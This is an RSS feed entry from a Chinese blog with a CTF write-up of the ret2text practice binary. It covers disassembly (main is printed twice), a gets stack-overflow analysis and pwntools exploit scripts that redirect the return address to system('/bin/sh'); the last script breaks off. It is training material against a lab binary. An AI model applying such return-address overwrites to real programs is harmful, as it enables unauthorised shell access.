<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/pwn/</link><description>Recent content in pwn on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sat, 31 Dec 2022 14:07:29 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>几个简单的 pwn 练习</title><link>https://nnnewb.github.io/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/</link><pubDate>Sat, 31 Dec 2022 14:07:29 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/</guid><description>&lt;h2 id="ret2text">ret2text&lt;/h2>
&lt;blockquote>
&lt;p>来源 &lt;a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/" target="_blank" rel="noopener"
>ctf-wiki basic-rop&lt;/a> 。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ret2text&lt;/code> 是最简单的一题了。gdb 确定目标地址后直接溢出即可。&lt;/p>
&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析">行为分析&lt;/h3>
&lt;p>运行 &lt;code>ret2text&lt;/code> 观察行为。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">There is something amazing here, do you know anything?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Maybe I will tell you next time !%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析">反编译分析&lt;/h3>
&lt;p>&lt;code>objdump -Sd ret2text&lt;/code> 然后找到 &lt;code>main&lt;/code> 函数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">08048648 &amp;lt;main&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048648: 55 push %ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048649: 89 e5 mov %esp,%ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804864b: 83 e4 f0 and $0xfffffff0,%esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804864e: 83 c4 80 add $0xffffff80,%esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048651: a1 60 a0 04 08 mov 0x804a060,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048656: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804865d: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804865e: c7 44 24 08 02 00 00 movl $0x2,0x8(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048665: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048666: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804866d: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804866e: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048671: e8 5a fe ff ff call 80484d0 &amp;lt;setvbuf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048676: a1 40 a0 04 08 mov 0x804a040,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804867b: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048682: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048683: c7 44 24 08 01 00 00 movl $0x1,0x8(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804868a: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804868b: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048692: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048693: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048696: e8 35 fe ff ff call 80484d0 &amp;lt;setvbuf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804869b: c7 04 24 6c 87 04 08 movl $0x804876c,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486a2: e8 d9 fd ff ff call 8048480 &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486a7: 8d 44 24 1c lea 0x1c(%esp),%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ab: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ae: e8 ad fd ff ff call 8048460 &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486b3: c7 04 24 a4 87 04 08 movl $0x80487a4,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ba: e8 91 fd ff ff call 8048450 &amp;lt;printf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486bf: b8 00 00 00 00 mov $0x0,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c4: c9 leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c5: c3 ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c6: 66 90 xchg %ax,%ax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c8: 66 90 xchg %ax,%ax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ca: 66 90 xchg %ax,%ax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486cc: 66 90 xchg %ax,%ax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ce: 66 90 xchg %ax,%ax08048648 &amp;lt;main&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048648: 55 push %ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048649: 89 e5 mov %esp,%ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804864b: 83 e4 f0 and $0xfffffff0,%esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804864e: 83 c4 80 add $0xffffff80,%esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048651: a1 60 a0 04 08 mov 0x804a060,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048656: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804865d: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804865e: c7 44 24 08 02 00 00 movl $0x2,0x8(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048665: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048666: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804866d: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804866e: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048671: e8 5a fe ff ff call 80484d0 &amp;lt;setvbuf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048676: a1 40 a0 04 08 mov 0x804a040,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804867b: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048682: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048683: c7 44 24 08 01 00 00 movl $0x1,0x8(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804868a: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804868b: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048692: 00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048693: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048696: e8 35 fe ff ff call 80484d0 &amp;lt;setvbuf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804869b: c7 04 24 6c 87 04 08 movl $0x804876c,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486a2: e8 d9 fd ff ff call 8048480 &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486a7: 8d 44 24 1c lea 0x1c(%esp),%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ab: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ae: e8 ad fd ff ff call 8048460 &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486b3: c7 04 24 a4 87 04 08 movl $0x80487a4,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486ba: e8 91 fd ff ff call 8048450 &amp;lt;printf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486bf: b8 00 00 00 00 mov $0x0,%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c4: c9 leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80486c5: c3 ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意到不安全函数 &lt;code>gets&lt;/code> 调用，计算 &lt;code>lea&lt;/code> 后参数应该是 &lt;code>0x1c(%esp)&lt;/code>，也就是栈顶往下28个字节。观察函数序言部分，&lt;code>add $0xffffff80,%esp&lt;/code> 分配了 128 个字节大小的栈空间，128-28=100 。初步猜测 &lt;code>gets&lt;/code> 参数长度 100 字节。输入大于 100 即造成溢出。&lt;/p>
&lt;p>然后我们寻找到想要返回的目标地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">080485fd &amp;lt;secure&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ... 略
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>gdb 调试计算 &lt;code>0x1c(%esp)&lt;/code> 到返回地址的距离。&lt;/p>
&lt;p>返回地址在 &lt;code>0xffffd24c&lt;/code>，&lt;code>0x1c(%esp)&lt;/code> 是 &lt;code>0xffffd1dc&lt;/code>，相减得 112 。&lt;/p>
&lt;p>尝试写出 exploit。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;bin/ret2text&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> b main
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">112&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;I&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x080485fd&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>调试发现段错误，继续阅读 &lt;code>secure&lt;/code> 函数的代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">080485fd &amp;lt;secure&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80485fd: 55 push %ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 80485fe: 89 e5 mov %esp,%ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048600: 83 ec 28 sub $0x28,%esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048603: c7 04 24 00 00 00 00 movl $0x0,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804860a: e8 61 fe ff ff call 8048470 &amp;lt;time@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804860f: 89 04 24 mov %eax,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048612: e8 99 fe ff ff call 80484b0 &amp;lt;srand@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048617: e8 c4 fe ff ff call 80484e0 &amp;lt;rand@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804861c: 89 45 f4 mov %eax,-0xc(%ebp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804861f: 8d 45 f0 lea -0x10(%ebp),%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048622: 89 44 24 04 mov %eax,0x4(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048626: c7 04 24 60 87 04 08 movl $0x8048760,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804862d: e8 be fe ff ff call 80484f0 &amp;lt;__isoc99_scanf@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048632: 8b 45 f0 mov -0x10(%ebp),%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048635: 3b 45 f4 cmp -0xc(%ebp),%eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048638: 75 0c jne 8048646 &amp;lt;secure+0x49&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804863a: c7 04 24 63 87 04 08 movl $0x8048763,(%esp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048641: e8 4a fe ff ff call 8048490 &amp;lt;system@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048646: c9 leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048647: c3 ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>人肉反编译下得到伪代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">srand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">time&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">var_0xc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">rand&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">var_0x10&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">var_0xc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">var_0x10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>soooooo，没必要硬怼随机数，直接跳到 &lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code> 就好。把 exploit 中跳转地址改成 &lt;code>0x804863a&lt;/code> 完事。&lt;/p>
&lt;h3 id="exploit">exploit&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./bin/ret2text&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
